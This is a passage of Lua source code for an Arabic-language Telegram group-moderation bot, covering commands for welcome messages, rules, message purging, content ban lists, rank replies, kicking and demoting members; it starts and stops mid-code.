local arr = {'‹ : 115 ÷ 32 = ? .','‹ : 44 × 64 = ? .','‹ : 780 ÷ 13 = ? .','‹ : 780 ÷ 13 = ? .','‹ : 6 + 78 = ? .','‹ : 10 × 19 = ? .','‹ : 728 ÷ 11 = ? .','‹ : 2484 × 548 = ? .','‹ : 384 + 484 = ? .','‹ : 4854 ÷ 38 = ? .','‹ : 6933 - 830 = ? .','‹ :1299 × 104 = ? .','‹ : 992 - 74 = ? .','‹ : 6192 + 592 = ? .','‹ : 291 - 93 × 48 = ? .','‹ : 132 ÷ 67 = ? . ','‹ : 9210 + 682 = ? .','‹ : 2100 × 30 = ? . '}
bot.sendText(msg.chat_id,msg.id,arr[math.random(#arr)],"md", true)
end
if text == "مصه" or text == "بوسه" then
local texting = {"مووووووووواححح????","مممممححه 🥴😥","خدك/ج نضيف 😂","البوسه بالف حمبي 🌝💋","ممحمحمحمحح 😰😖","كل شويه ابوسك كافي 😏","ماابوسه والله هذا زاحف🦎","محح هاي لحاته صاكه??"}
if tonumber(msg.reply_to_message_id) == 0 then
bot.sendText(msg.chat_id,msg.id,"*‹ : يجب عمل رد على رساله شخص*","md", true)
return false
end
bot.sendText(msg.chat_id,msg.reply_to_message_id,"*"..texting[math.random(#texting)].."*","md", true)
end
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:phme") then
if text == "صورتي" then
local photo = bot.getUserProfilePhotos(msg.sender.user_id)
if photo.total_count > 0 then
bot.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id," * حسابك يحتوي على ("..photo.total_count.." ) صوره*", "md")
else
bot.sendText(msg.chat_id,msg.id,'*‹ : لا توجد صوره في حسابك*',"md",true) 
end
end
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":link:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":link:add")
if text and text:match("^https://t.me/+(.*)$") then     
redis:set(bot_id..":"..msg.chat_id..":link",text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ الرابط الجديد بنجاح .*","md", true)
else
bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا الرابط خطأ .*","md", true)
end
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":id:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":id:add")
redis:set(bot_id..":"..msg.chat_id..":id",text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ الايدي الجديد بنجاح .*","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":we:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":we:add")
redis:set(bot_id..":"..msg.chat_id..":Welcome",text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ الترحيب الجديد بنجاح .*","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":nameGr:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":nameGr:add")
if GetInfoBot(msg).Info == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : ليس لدي صلاحيات تغيير المعلومات*',"md",true)  
return false
end
bot.setChatTitle(msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الاسم بنجاح .*","md", true)
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":decGr:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":decGr:add")
if GetInfoBot(msg).Info == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : ليس لدي صلاحيات تغيير المعلومات*',"md",true)  
return false
end
bot.setChatDescription(msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الوصف بنجاح .*","md", true)
end
if BasicConstructor(msg) then
if text == 'تغيير اسم المجموعه' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":nameGr:add",true)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بارسال الاسم الجديد الان .*","md", true)
end
if text == 'تغيير الوصف' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":decGr:add",true)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بارسال الوصف الجديد الان .*","md", true)
end
end
if text and redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":law:add") then
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":law:add")
redis:set(bot_id..":"..msg.chat_id..":Law",text)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم حفظ القوانين بنجاح .*","md", true)
end
if Owner(msg) then
if text == 'تعين قوانين' or text == 'تعيين قوانين' or text == 'وضع قوانين' or text == 'اضف قوانين' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":law:add",true)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بأرسال قائمه القوانين الان .*","md", true)
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then
redis:del(bot_id..":"..msg.chat_id..":Law")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." الجديد بنجاح  .*","md", true)
end
if text == "تنظيف التعديل" or text == "مسح التعديل" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم البحث عن الرسائل المعدله .*","md",true)
msgid = (msg.id - (1048576*250))
y = 0
r = 1048576
for i=1,250 do
r = r + 1048576
Delmsg = bot.getMessage(msg.chat_id,msgid + r)
if Delmsg and Delmsg.edit_date and Delmsg.edit_date ~= 0 then
bot.deleteMessages(msg.chat_id,{[1]= Delmsg.id}) 
y = y + 1
end
end
if y == 0 then 
t = "*‹ : لم يتم العثور على رسائل معدله ضمن 250 رساله السابقه .*"
else
t = "*‹ : تم حذف ( "..y.." ) من الرسائل المعدله  .*"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == "تنظيف الميديا" or text == "مسح الميديا" then
bot.sendText(msg.chat_id,msg.id,"*‹ : يتم البحث عن الميديا .*","md",true)
msgid = (msg.id - (1048576*250))
y = 0
r = 1048576
for i=1,250 do
r = r + 1048576
Delmsg = bot.getMessage(msg.chat_id,msgid + r)
if Delmsg and Delmsg.content and Delmsg.content.luatele ~= "messageText" then
bot.deleteMessages(msg.chat_id,{[1]= Delmsg.id}) 
y = y + 1
end
end
if y == 0 then 
t = "*‹ : لم يتم العثور على ميديا ضمن 250 رساله السابقه .*"
else
t = "*‹ : تم حذف ( "..y.." ) من الميديا  .*"
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'رفع الادمنيه' then
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : البوت لا يمتلك صلاحيه .*","md",true)  
return false
end
local info_ = bot.getSupergroupMembers(msg.chat_id, "Administrators", " .*", 0, 200)
local list_ = info_.members
y = 0
for k, v in pairs(list_) do
if info_.members[k].bot_info == nil then
if info_.members[k].status.luatele == "chatMemberStatusCreator" then
redis:sadd(bot_id..":"..msg.chat_id..":Status:Creator",v.member_id.user_id) 
else
redis:sadd(bot_id..":"..msg.chat_id..":Status:Administrator",v.member_id.user_id) 
y = y + 1
end
end
end
bot.sendText(msg.chat_id,msg.id,'*‹ : تم رفع  ('..y..') ادمن بالمجموعه .*',"md",true)  
end
if text == 'تعين ترحيب' or text == 'تعيين ترحيب' or text == 'وضع ترحيب' or text == 'اضف ترحيب' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":we:add",true)
bot.sendText(msg.chat_id,msg.id,"*‹ : ارسل الترحيب الجديد الان .\n‹ : لتتمكن من اضافته .*\nٴ━═━═━═━═━═━═━═━\n‹ : user - *يوزر المستخدم .*\n‹ : name - *اسم المستخدم .*","md", true)
end
if text == 'الترحيب' then
if redis:get(bot_id..":"..msg.chat_id..":Welcome") then
t = redis:get(bot_id..":"..msg.chat_id..":Welcome")
else 
t = "*‹ : لم يتم وضع ترحيب .*"
end
bot.sendText(msg.chat_id,msg.id,t,"md", true)
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then
redis:del(bot_id..":"..msg.chat_id..":Welcome")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." الجديد بنجاح .*","md", true)
end
if text == 'مسح الايدي' or text == 'حذف الايدي' then
redis:del(bot_id..":"..msg.chat_id..":id")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." الجديد بنجاح .*","md", true)
end
if text == 'تعين الايدي' or text == 'تعيين الايدي' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":id:add",true)
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : FSouRce u .',url="https://t.me/FeLX_TEaM"}},
}
}
bot.sendText(msg.chat_id,msg.id,'*‹ : ارسل الايدي الجديد الان .\n‹ : لتتمكن من اضافته .*\n━═━═━═━═━═━═━═━\n‹ : #username - *اسم المستخدم .*\n‹ : #msgs - *عدد رسائل المستخدم .*\n‹ : #photos - *عدد صور المستخدم .*\n‹ : #id - *ايدي المستخدم .*\n‹ : #auto - *تفاعل المستخدم* .\n‹ : #stast - *موقع المستخدم .*\n‹ : #edit - *عدد السحكات .*\n‹ : #AddMem - *عدد الجهات .*\n‹ : #Description - *تعليق الصوره .*',"md", true, false, false, false, reply_markup)
end
if text == "تغيير الايدي" or text == "تغير الايدي" then 
local List = {'◇︰𝘜𝘴𝘌𝘳 - #username \n◇︰𝘪𝘋 - #id\n◇︰𝘚𝘵𝘈𝘴𝘵 - #stast\n◇︰𝘈𝘶𝘛𝘰 - #cont \n◇︰𝘔𝘴𝘎𝘴 - #msgs','◇︰Msgs : #msgs .\n◇︰ID : #id .\n◇︰Stast : #stast .\n◇︰UserName : #username .','˛ َ𝖴ᥱ᥉ : #username  .\n˛ َ𝖲𝗍ُɑِ  : #stast   . \n˛ َ𝖨ժ : #id  .\n˛ َ𝖬⁪⁬⁮᥉𝗀ِ : #msgs   .','⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 ??𝒐 𝑮𝒓𝒐𝒖𝒑 ★\n- 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏\n- 🖤 | 𝑺𝑻𝑨 : #stast \n- 🖤 | 𝑰𝑫 : #id ‌‌‏\n- 🖤 | 𝑴𝑺𝑮 : #msgs','◇︰𝖬𝗌𝗀𝗌 : #msgs  .\n◇︰𝖨𝖣 : #id  .\n◇︰𝖲𝗍𝖺𝗌𝗍 : #stast .\n◇︰𝖴𝗌𝖾𝗋??𝖺𝗆𝖾 : #username .','⌁ Use ⇨{#username} \n⌁ Msg⇨ {#msgs} \n⌁ Sta ⇨ {#stast} \n⌁ iD ⇨{#id} \n▿▿▿','゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .\n゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .\n゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .\n゠𝙸𝙳 𖨈 #id 𖥲 .','▹ 𝙐SE?? 𖨄 #username  𖤾.\n▹ 𝙈𝙎𝙂 𖨄 #msgs  𖤾.\n▹ 𝙎𝙏?? 𖨄 #stast  𖤾.\n▹ 𝙄𝘿 𖨄 #id 𖤾.','➼ : 𝐼𝐷 𖠀 #id\n➼ : 𝑈𝑆𝐸𝑅 𖠀 #username\n➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs\n➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast\n➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit\n','┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .\n├ 𝐌𝐒?? 𖤱 #msgs 𖦴 .\n├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .\n└ 𝐈𝐃 𖤱 #id 𖦴 .','୫ 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➤ #username\n୫ 𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 ➤ #msgs\n୫ 𝙎𝙏𝘼𝙏𝙎 ➤ #stast\n୫ 𝙄𝘿 ➤ #id','☆-𝐮𝐬𝐞𝐫 : #username 𖣬  \n☆-𝐦𝐬𝐠  : #msgs 𖣬 \n☆-𝐬𝐭𝐚 : #stast 𖣬 \n☆-𝐢𝐝  : #id 𖣬','𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇮🇶- #id \n𝐔𝐬𝐞𝐫𝐍𝐚☤🇮🇶- #username \n𝐒𝐭𝐚𝐬𝐓 ☤🇮🇶- #stast \n𝐌𝐬𝐠𝐒☤🇮🇶 - #msgs','.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  \n.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast\n.𖣂 𝙡𝘿 , #id  \n.𖣂 𝙂𝙖𝙢𝙨 , #game  \n.𖣂 𝙢𝙨𝙂𝙨 , #msgs'}
local Text_Rand = List[math.random(#List)]
redis:set(bot_id..":"..msg.chat_id..":id",Text_Rand)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغير كليشة الايدي .*","md",true)  
end
if text == 'مسح الرابط' or text == 'حذف الرابط' then
redis:del(bot_id..":"..msg.chat_id..":link")
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." الجديد بنجاح .*","md", true)
end
if text == 'تعين الرابط' or text == 'تعيين الرابط' or text == 'وضع رابط' or text == 'تغيير الرابط' or text == 'تغير الرابط' then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":link:add",true)
bot.sendText(msg.chat_id,msg.id,"*‹ : قم بارسال الرابط الجديد الان .*","md", true)
end
if text == 'فحص البوت' then 
local StatusMember = bot.getChatMember(msg.chat_id,bot_id).status.luatele
if (StatusMember ~= "chatMemberStatusAdministrator") then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت عضو في المجموعه*',"md",true) 
return false
end
local GetMemberStatus = bot.getChatMember(msg.chat_id,bot_id).status
if GetMemberStatus.can_change_info then
change_info = '✔️' else change_info = '❌'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '✔️' else delete_messages = '❌'
end
if GetMemberStatus.can_invite_users then
invite_users = '✔️' else invite_users = '❌'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '✔️' else pin_messages = '❌'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '✔️' else restrict_members = '❌'
end
if GetMemberStatus.can_promote_members then
promote = '✔️' else promote = '❌'
end
PermissionsUser = '*\n‹ : صلاحيات البوت في المجموعه :\nٴ━═━═━═━═━═━═━═━ '..'\n‹ : تغيير المعلومات : '..change_info..'\n‹ : تثبيت الرسائل : '..pin_messages..'\n‹ : اضافه مستخدمين : '..invite_users..'\n‹ : مسح الرسائل : '..delete_messages..'\n‹ : حظر المستخدمين : '..restrict_members..'\n‹ : اضافه المشرفين : '..promote..'\n\n*'
bot.sendText(msg.chat_id,msg.id,PermissionsUser,"md",true) 
return false
end
if not redis:get(bot_id..":"..msg.chat_id..":settings:delmsg") then
if text == ("امسح") and BasicConstructor(msg) then 
if redis:get(bot_id..":"..msg.chat_id..":Amsh") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل امسح بواسطه المالك .*","md",true)  
end
local list = redis:smembers(bot_id..":"..msg.chat_id..":mediaAude:ids")
for k,v in pairs(list) do
local Message = v
if Message then
t = "‹ : تم مسح "..k.." من الوسائط الموجوده ."
bot.deleteMessages(msg.chat_id,{[1]= Message})
redis:del(bot_id..":"..msg.chat_id..":mediaAude:ids")
end
end
if #list == 0 then
t = "‹ : لا يوجد ميديا في المجموعه ."
end
Text = Reply_Status(msg.sender.user_id,"*"..t.."*").by
bot.sendText(msg.chat_id,msg.id,Text,"md",true)
end
if text and text:match('^تنظيف (%d+)$') then
local NumMessage = text:match('^تنظيف (%d+)$')
if msg.can_be_deleted_for_all_users == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : البوت ليس ادمن في المجموعه .*","md",true)  
return false
end
if GetInfoBot(msg).Delmsg == false then
bot.sendText(msg.chat_id,msg.id,"*‹ : البوت لا يمتلك صلاحيه حذف الرسائل .*","md",true)  
return false
end
if tonumber(NumMessage) > 1000 then
bot.sendText(msg.chat_id,msg.id,'* لا تستطيع حذف اكثر من 1000 رساله*',"md",true)  
return false
end
local Message = msg.id
for i=1,tonumber(NumMessage) do
bot.deleteMessages(msg.chat_id,{[1]= Message})
Message = Message - 1048576
end
bot.sendText(msg.chat_id, msg.id,"*‹ : تم تنظيف ( "..NumMessage.." ) رساله  .*", 'md')
end
end
if text == 'مسح الرتب' or text == 'حذف الرتب' then
redis:del(bot_id.."Reply:developer"..msg.chat_id)
redis:del(bot_id..":Reply:mem"..msg.chat_id)
redis:del(bot_id..":Reply:Vips"..msg.chat_id)
redis:del(bot_id..":Reply:Administrator"..msg.chat_id)
redis:del(bot_id..":Reply:BasicConstructor"..msg.chat_id)
redis:del(bot_id..":Reply:Constructor"..msg.chat_id)
redis:del(bot_id..":Reply:Owner"..msg.chat_id)
redis:del(bot_id..":Reply:Creator"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*","md", true)
end
if text and text:match("^تغير رد المطور (.*)$") then
local Teext = text:match("^تغير رد المطور (.*)$") 
redis:set(bot_id.."Reply:developer"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المالك (.*)$") then
local Teext = text:match("^تغير رد المالك (.*)$") 
redis:set(bot_id..":Reply:Creator"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المنشئ الاساسي (.*)$") then
local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
redis:set(bot_id..":Reply:BasicConstructor"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المنشئ (.*)$") then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
redis:set(bot_id..":Reply:Constructor"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المدير (.*)$") then
local Teext = text:match("^تغير رد المدير (.*)$") 
redis:set(bot_id..":Reply:Owner"..msg.chat_id,Teext) 
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد الادمن (.*)$") then
local Teext = text:match("^تغير رد الادمن (.*)$") 
redis:set(bot_id..":Reply:Administrator"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد المميز (.*)$") then
local Teext = text:match("^تغير رد المميز (.*)$") 
redis:set(bot_id..":Reply:Vips"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text and text:match("^تغير رد العضو (.*)$") then
local Teext = text:match("^تغير رد العضو (.*)$") 
redis:set(bot_id..":Reply:mem"..msg.chat_id,Teext)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم تغيير الرد بنجاح الى :  .*"..Teext.. "", 'md')
elseif text == 'حذف رد المطور' then
redis:del(bot_id..":Reply:developer"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد المالك' then
redis:del(bot_id..":Reply:Creator"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد المنشئ الاساسي' then
redis:del(bot_id..":Reply:BasicConstructor"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد المنشئ' then
redis:del(bot_id..":Reply:Constructor"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد المدير' then
redis:del(bot_id..":Reply:Owner"..msg.chat_id) 
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد الادمن' then
redis:del(bot_id..":Reply:Administrator"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد المميز' then
redis:del(bot_id..":Reply:Vips"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
elseif text == 'حذف رد العضو' then
redis:del(bot_id..":Reply:mem"..msg.chat_id)
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح .*", 'md')
end
if text == 'الغاء تثبيت الكل' or text == 'الغاء التثبيت' then
if GetInfoBot(msg).PinMsg == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : ليس لدي صلاحيه تثبيت رسائل*',"md",true)  
return false
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم الغاء تثبيت جميع الرسائل المثبته .*","md",true)
bot.unpinAllChatMessages(msg.chat_id) 
end
end
if BasicConstructor(msg) then
----------------------------------------------------------------------------------------------------
if text == "قائمه المنع" or text == "الممنوعات" or text == "قائمة المنع" then
local Photo =redis:scard(bot_id.."mn:content:Photo"..msg.chat_id) 
local Animation =redis:scard(bot_id.."mn:content:Animation"..msg.chat_id)  
local Sticker =redis:scard(bot_id.."mn:content:Sticker"..msg.chat_id)  
local Text =redis:scard(bot_id.."mn:content:Text"..msg.chat_id)  
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : الصور .', data="mn_"..msg.sender.user_id.."_ph"},{text = '‹ : الكلمات .', data="mn_"..msg.sender.user_id.."_tx"}},
{{text = '‹ : المتحركات .', data="mn_"..msg.sender.user_id.."_gi"},{text = '‹ : الملصقات .',data="mn_"..msg.sender.user_id.."_st"}},
{{text = '‹ : تحديث .',data="mn_"..msg.sender.user_id.."_up"}},
{{text = '‹ : FSouRce u .',url="https://t.me/FeLX_TEaM"}},
}
}
bot.sendText(msg.chat_id,msg.id,"* ‹ : تحوي قائمه المنع على .\n‹ : الصور ( "..Photo.." ) .\n‹ : الكلمات ( "..Text.." ) .\n‹ : الملصقات  ( "..Sticker.." )\n‹ : المتحركات  ( "..Animation.." ) .\n‹ : اضغط على القائمه المراد حذفها .\nٴ━═━═━═━═━═━═━═━ *","md",true, false, false, false, reply_markup)
return false
end
if text == "مسح قائمه المنع" or text == "مسح الممنوعات" then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم "..text.." بنجاح  .*","md",true)  
redis:del(bot_id.."mn:content:Text"..msg.chat_id) 
redis:del(bot_id.."mn:content:Sticker"..msg.chat_id) 
redis:del(bot_id.."mn:content:Animation"..msg.chat_id) 
redis:del(bot_id.."mn:content:Photo"..msg.chat_id) 
end
if text == "منع" and msg.reply_to_message_id == 0 then
bot.sendText(msg.chat_id,msg.id,"*‹ : قم الان بارسال ( نص او الميديا ) لمنعه من المجموعه .*","md",true)  
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":mn:set",true)
end
if text == "منع" and msg.reply_to_message_id ~= 0 then
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if Remsg.content.text then   
if redis:sismember(bot_id.."mn:content:Text"..msg.chat_id,Remsg.content.text.text) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع الكلمه سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Text"..msg.chat_id,Remsg.content.text.text)  
ty = "الرساله"
elseif Remsg.content.sticker then   
if redis:sismember(bot_id.."mn:content:Sticker"..msg.chat_id,Remsg.content.sticker.sticker.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع الملصق سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Sticker"..msg.chat_id, Remsg.content.sticker.sticker.remote.unique_id)  
ty = "الملصق"
elseif Remsg.content.animation then
if redis:sismember(bot_id.."mn:content:Animation"..msg.chat_id,Remsg.content.animation.animation.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع المتحركه سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Animation"..msg.chat_id, Remsg.content.animation.animation.remote.unique_id)  
ty = "المتحركه"
elseif Remsg.content.photo then
if redis:sismember(bot_id.."mn:content:Photo"..msg.chat_id,Remsg.content.photo.sizes[1].photo.remote.unique_id) then
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع الصوره سابقا .*","md",true)
return false
end
redis:sadd(bot_id.."mn:content:Photo"..msg.chat_id,Remsg.content.photo.sizes[1].photo.remote.unique_id)  
ty = "الصوره"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم منع "..ty.." بنجاح .*","md",true)  
end
if text == "الغاء منع" and msg.reply_to_message_id ~= 0 then
Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if Remsg.content.text then   
redis:srem(bot_id.."mn:content:Text"..msg.chat_id,Remsg.content.text.text)  
ty = "الرساله"
elseif Remsg.content.sticker then   
redis:srem(bot_id.."mn:content:Sticker"..msg.chat_id, Remsg.content.sticker.sticker.remote.unique_id)  
ty = "الملصق"
elseif Remsg.content.animation then
redis:srem(bot_id.."mn:content:Animation"..msg.chat_id, Remsg.content.animation.animation.remote.unique_id)  
ty = "المتحركه"
elseif Remsg.content.photo then
redis:srem(bot_id.."mn:content:Photo"..msg.chat_id,Remsg.content.photo.sizes[1].photo.remote.unique_id)  
ty = "الصوره"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : تم الغاء منع "..ty.." بنجاح .*","md",true)  
end
----------------------------------------------------------------------------------------------------
end
----------------------------------------------------------------------------------------------------
if msg and msg.content.text and msg.content.text.entities[1] and (msg.content.text.entities[1].luatele == "textEntity") and (msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName") then
if text and text:match('^كشف (.*)$') or text and text:match('^ايدي (.*)$') then
local UserName = text:match('^كشف (.*)$') or text:match('^ايدي (.*)$')
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
sm = bot.getChatMember(msg.chat_id,usetid)
if sm.status.luatele == "chatMemberStatusCreator"  then
gstatus = "المنشئ"
elseif sm.status.luatele == "chatMemberStatusAdministrator" then
gstatus = "المشرف"
else
gstatus = "العضو"
end
bot.sendText(msg.chat_id,msg.id,"*‹ : الايدي : *( `"..(usetid).."` *)*\n*‹ : الرتبه : *( `"..(Get_Rank(usetid,msg.chat_id)).."` *)*\n*‹ : الموقع : *( `"..(gstatus).."` *)*\n*‹ : عدد الرسائل : *( `"..(redis:get(bot_id..":"..msg.chat_id..":"..usetid..":message") or 1).."` *) .*" ,"md",true)  
end
end
if Administrator(msg)  then
if text and text:match('^طرد (.*)$') then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
if not BasicConstructor(msg) then
if redis:get(bot_id..":"..msg.chat_id..":settings:kik") then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : الطرد معطل بواسطه المنشئين الاساسيين .*").yu,"md",true)
return false
end
end
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*‹ : البوت لا يمتلك صلاحيه طرد الاعضاء* ',"md",true)  
return false
end
if not Norank(usetid,msg.chat_id) then
t = "*‹ : لا يمكنك طرد "..Get_Rank(usetid,msg.chat_id).." .*"
else
t = "*‹ : تم طرده بنجاح .*"
bot.setChatMemberStatus(msg.chat_id,usetid,'banned',0)
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(usetid,t).i,"md",true)    
end
end
if text and text:match("^تنزيل (.*) (.*)") and tonumber(msg.reply_to_message_id) == 0 then
if msg.content.text.entities[1].luatele == "textEntity" and msg.content.text.entities[1].type.luatele == "textEntityTypeMentionName" then
usetid = msg.content.text.entities[1].type.user_id
local UserInfo = bot.getUser(usetid)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
return false
end
local infotxt = {text:match("^تنزيل (.*) (.*)")}
TextMsg = infotxt[1]
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
if not redis:sismember(bot_id..srt1.."Status:"..srt,usetid) then
